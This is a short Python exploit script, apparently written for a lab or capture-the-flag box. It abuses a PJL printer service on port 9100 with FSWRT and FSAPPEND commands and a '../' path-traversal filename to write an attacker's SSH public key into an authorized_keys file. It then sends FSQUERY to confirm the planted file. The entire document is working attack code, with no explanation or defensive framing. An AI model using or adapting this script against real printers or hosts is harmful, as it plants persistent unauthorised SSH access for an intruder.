#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)

for verb in ("FSWRT", "FSAPPEND"):
    s = socket.socket()
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL {verb} NAME="{PATH}" SIZE={N}\r\n'.encode() + KEY)
    s.close()
    print("sent", verb)

s = socket.socket()
s.settimeout(4)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
print("Q", s.recv(2048))
s.close()